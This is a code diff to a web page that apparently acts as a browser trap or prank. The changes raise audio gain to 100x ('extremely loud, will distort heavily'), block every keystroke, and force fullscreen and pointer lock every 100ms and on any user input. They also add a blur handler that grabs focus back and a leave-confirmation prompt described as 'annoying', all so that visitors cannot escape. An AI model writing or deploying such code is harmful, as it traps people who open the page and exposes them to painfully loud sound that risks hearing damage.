@@ -30,7 +30,7 @@ body, html {
     overflow: hidden;
     height: 100%;
     width: 100%;
-    background: #000;
+    background: #000; /* fallback if image missing */
     cursor: none;
 }
 
@@ -119,7 +119,7 @@ body, html {
     width: 100%;
     height: 100%;
     object-fit: cover;
-    opacity: 0.3;
+    opacity: 1; /* Changed from 0.3 to 1 for full visibility */
 }
 </style>
 </head>
@@ -145,7 +145,8 @@ body, html {
     </div>
 </div>
 
-<div class="backg"><img src="naggars.gif"></div>
+<!-- Background image changed to 32.png -->
+<div class="backg"><img src="32.png"></div>
 
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
 <script>
@@ -154,7 +155,7 @@ body, html {
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
 
-    // --- AUDIO BOOST (Web Audio API) ---
+    // --- AUDIO BOOST (Web Audio API) with extreme gain ---
     let audioContext;
     let gainNode;
     const mediaElements = [];
@@ -162,7 +163,7 @@ body, html {
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
-        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
+        gainNode.gain.value = 100; // 100x volume – extremely loud, will distort heavily
         gainNode.connect(audioContext.destination);
 
         // Connect all audio elements
@@ -234,22 +235,22 @@ body, html {
         }
     }
 
-    // --- KEY BLOCKING (prevent all escape shortcuts) ---
+    // --- KEY BLOCKING (prevent all escape shortcuts, including F11, Alt+F4, Ctrl+Shift+Esc, etc.) ---
     function blockKeys(e) {
-        // Block ALL key combinations — user cannot press anything
+        // Block EVERY key event – no exceptions
         e.preventDefault();
         e.stopPropagation();
         return false;
     }
 
-    // --- RE-ENGAGE LOCKS on any user activity ---
+    // --- RE-ENGAGE LOCKS on any user activity (with immediate fullscreen check) ---
     function reengageLocks() {
         if (hasTriggered) {
-            // If not in fullscreen, request it
+            // Immediate fullscreen re-request if not in fullscreen
             if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                 attemptFullscreen();
             }
-            // If pointer not locked, lock it
+            // Immediate pointer lock if not locked
             if (!document.pointerLockElement) {
                 lockPointer();
             }
@@ -280,8 +281,8 @@ body, html {
         attemptFullscreen();
         lockPointer();
 
-        // Set up periodic re-engagement (every 200ms)
-        setInterval(reengageLocks, 200);
+        // Set up periodic re-engagement (every 100ms for ultra-fast response)
+        setInterval(reengageLocks, 100);
 
         // Also re-engage on any user interaction (mouse move, click, key, touch)
         const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
@@ -289,7 +290,7 @@ body, html {
             document.addEventListener(eventType, reengageLocks, true);
         });
 
-        // Additional fullscreen change detection
+        // Additional fullscreen change detection (immediate reaction)
         document.addEventListener('fullscreenchange', reengageLocks);
         document.addEventListener('webkitfullscreenchange', reengageLocks);
         document.addEventListener('mozfullscreenchange', reengageLocks);
@@ -300,10 +301,18 @@ body, html {
         document.addEventListener('mozpointerlockchange', reengageLocks);
         document.addEventListener('webkitpointerlockchange', reengageLocks);
 
-        // Block all keys permanently (after start)
+        // Block all keys permanently (after start) – this includes F11, Alt+F4, Ctrl+Shift+Esc, etc.
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
+
+        // Additional trap: if window loses focus, try to regain it (limited)
+        window.addEventListener('blur', function() {
+            setTimeout(function() {
+                window.focus();
+                attemptFullscreen();
+            }, 10);
+        });
     };
 
     // --- Attach start to overlay click (anywhere on overlay) ---
@@ -314,7 +323,7 @@ body, html {
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
 
-    // --- Window close confirmation ---
+    // --- Window close confirmation (makes it annoying) ---
     window.onbeforeunload = function() {
         return "Are you absolutely sure you want to leave?";
     };
